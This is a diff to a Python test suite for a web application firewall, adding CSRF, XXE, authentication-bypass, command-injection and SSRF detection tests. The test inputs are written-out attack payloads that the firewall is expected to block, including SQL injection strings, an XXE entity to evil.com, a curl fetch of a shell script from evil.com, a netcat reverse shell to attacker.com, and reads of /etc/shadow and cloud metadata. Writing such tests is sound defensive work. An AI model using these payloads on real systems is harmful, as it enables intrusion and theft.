@@ -36,6 +36,7 @@ class TestWebApplicationFirewall:
             method="POST",
             path="/login",
             body="username=admin&password=' OR '1'='1",
+            headers={"Origin": "https://example.com"},
         )
         assert not result.allowed
 
@@ -46,6 +47,7 @@ class TestWebApplicationFirewall:
             method="POST",
             path="/comment",
             body="<script>alert('xss')</script>",
+            headers={"Origin": "https://example.com"},
         )
         assert not result.allowed
         assert result.action == WAFAction.BLOCK
@@ -92,7 +94,8 @@ class TestWebApplicationFirewall:
             method="POST",
             path="/api/data",
             body='{"name": "Alice", "age": 30}',
-            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
+                     "Origin": "https://example.com"},
         )
         assert result.allowed
 
@@ -153,7 +156,8 @@ class TestWebApplicationFirewall:
         waf = WebApplicationFirewall(self.logger)
         waf.inspect_request(method="GET", path="/safe")
         waf.inspect_request(method="GET", path="/search?q=' UNION SELECT 1--")
-        waf.inspect_request(method="POST", path="/x", body="<script>alert(1)</script>")
+        waf.inspect_request(method="POST", path="/x", body="<script>alert(1)</script>",
+                            headers={"Origin": "https://example.com"})
 
         stats = waf.get_stats()
         assert stats["total_requests"] == 3
@@ -270,3 +274,337 @@ class TestWebApplicationFirewall:
             e for e in self.logger.events if e["event_type"] == "request_allowed"
         ]
         assert len(allowed_events) >= 1
+
+    # =======================================================================
+    # 11 -- CSRF detection
+    # =======================================================================
+
+    def test_csrf_post_without_token_or_headers_blocked(self) -> None:
+        """POST with no CSRF token, no Origin, no Referer should be blocked."""
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/transfer",
+            body='{"amount": 1000}',
+            headers={"Content-Type": "application/json"},
+        )
+        assert not result.allowed
+        assert "CSRF" in result.block_reason.upper()
+
+    def test_csrf_put_without_token_or_headers_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="PUT",
+            path="/api/profile",
+            body='{"name": "hacked"}',
+            headers={"Content-Type": "application/json"},
+        )
+        assert not result.allowed
+        assert "CSRF" in result.block_reason.upper()
+
+    def test_csrf_delete_without_token_or_headers_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="DELETE",
+            path="/api/user/42",
+            headers={"Content-Type": "application/json"},
+        )
+        assert not result.allowed
+
+    def test_csrf_post_with_csrf_token_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/transfer",
+            body="csrf_token=abc123&amount=100",
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+        )
+        assert result.allowed
+
+    def test_csrf_post_with_csrf_header_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/transfer",
+            body='{"amount": 100}',
+            headers={"Content-Type": "application/json", "X-CSRF-Token": "abc123"},
+        )
+        assert result.allowed
+
+    def test_csrf_post_with_origin_header_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/transfer",
+            body='{"amount": 100}',
+            headers={"Content-Type": "application/json", "Origin": "https://example.com"},
+        )
+        assert result.allowed
+
+    def test_csrf_post_with_referer_header_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/transfer",
+            body='{"amount": 100}',
+            headers={"Content-Type": "application/json", "Referer": "https://example.com/form"},
+        )
+        assert result.allowed
+
+    def test_csrf_get_not_affected(self) -> None:
+        """GET requests should not trigger CSRF checks."""
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/api/data",
+            headers={"Content-Type": "application/json"},
+        )
+        assert result.allowed
+
+    def test_csrf_stats_tracking(self) -> None:
+        self.waf.inspect_request(
+            method="POST",
+            path="/api/action",
+            body="data=test",
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+        )
+        stats = self.waf.get_stats()
+        assert stats["csrf_blocked"] >= 1
+
+    # =======================================================================
+    # 12 -- XXE detection
+    # =======================================================================
+
+    def test_xxe_entity_declaration_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/xml",
+            body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/payload">]>',
+            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
+        )
+        assert not result.allowed
+        assert "XXE" in result.block_reason.upper()
+
+    def test_xxe_system_keyword_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/xml",
+            body='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/payload">]>',
+            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_xxe_file_protocol_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/xml",
+            body='<foo>file:///etc/shadow</foo>',
+            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_xxe_doctype_internal_subset_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/xml",
+            body='<!DOCTYPE test [ <!ELEMENT test ANY> ]>',
+            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_xxe_php_filter_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/xml",
+            body='php://filter/convert.base64-encode/resource=index.php',
+            headers={"Content-Type": "application/xml", "Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_xxe_clean_xml_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/api/xml",
+            body='{"user": "Alice", "action": "read"}',
+            headers={"Content-Type": "application/json", "Origin": "https://example.com"},
+        )
+        assert result.allowed
+
+    # =======================================================================
+    # 13 -- Authentication bypass detection
+    # =======================================================================
+
+    def test_auth_bypass_admin_comment_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/login",
+            body="username=admin'--&password=anything",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+        assert "AUTH_BYPASS" in result.block_reason.upper() or "SQLI" in result.block_reason.upper()
+
+    def test_auth_bypass_or_1_equals_1_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/login",
+            body="username=x&password=' OR 1=1",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_auth_bypass_or_true_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/login",
+            body="username=admin&password=' OR true",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_auth_bypass_token_null_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/api/admin?token=null",
+        )
+        assert not result.allowed
+
+    def test_auth_bypass_admin_hash_comment_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/login",
+            body="username=admin'#&password=x",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    # =======================================================================
+    # 14 -- Command injection detection
+    # =======================================================================
+
+    def test_cmdi_semicolon_chain_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/ping?host=127.0.0.1; whoami",
+        )
+        assert not result.allowed
+        assert "COMMAND_INJECTION" in result.block_reason.upper()
+
+    def test_cmdi_pipe_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/lookup?domain=example.com| whoami",
+        )
+        assert not result.allowed
+
+    def test_cmdi_and_chain_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/run",
+            body="cmd=test&& curl http://evil.com/shell.sh",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_cmdi_backtick_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/search?q=`id`",
+        )
+        assert not result.allowed
+
+    def test_cmdi_dollar_paren_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/search?q=$(whoami)",
+        )
+        assert not result.allowed
+
+    def test_cmdi_shell_path_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/exec",
+            body="cmd=/bin/bash -c 'echo pwned'",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_cmdi_netcat_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="POST",
+            path="/exec",
+            body="cmd=nc -e /bin/sh attacker.com 4444",
+            headers={"Origin": "https://example.com"},
+        )
+        assert not result.allowed
+
+    def test_cmdi_clean_command_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/ping?host=192.168.1.1",
+        )
+        assert result.allowed
+
+    # =======================================================================
+    # 15 -- SSRF detection
+    # =======================================================================
+
+    def test_ssrf_localhost_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/proxy?url=http://localhost/admin",
+        )
+        assert not result.allowed
+        assert "SSRF" in result.block_reason.upper()
+
+    def test_ssrf_127_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/proxy?url=http://127.0.0.1:8080/secret",
+        )
+        assert not result.allowed
+
+    def test_ssrf_10_network_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/fetch?url=http://10.0.0.1/internal",
+        )
+        assert not result.allowed
+
+    def test_ssrf_192_168_network_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/fetch?url=http://192.168.1.1/router",
+        )
+        assert not result.allowed
+
+    def test_ssrf_169_254_metadata_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/fetch?url=http://169.254.169.254/latest/meta-data/",
+        )
+        assert not result.allowed
+
+    def test_ssrf_file_protocol_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/fetch?url=file:///etc/passwd",
+        )
+        assert not result.allowed
+
+    def test_ssrf_ipv6_loopback_blocked(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/fetch?url=http://[::1]/admin",
+        )
+        assert not result.allowed
+
+    def test_ssrf_external_url_allowed(self) -> None:
+        result = self.waf.inspect_request(
+            method="GET",
+            path="/fetch?url=http://example.com/page",
+        )
+        assert result.allowed
+
+    # =======================================================================
+    # 16 -- New stats counters
+    # =======================================================================
+
+    def test_new_category_stats_present(self) -> None:
+        """All new category stat keys should exist in the stats dict."""
+        stats = self.waf.get_stats()
+        for key in ("csrf_blocked", "xxe_blocked", "auth_bypass_blocked",
+                     "command_injection_blocked", "ssrf_blocked"):
+            assert key in stats, f"Missing stat key: {key}"
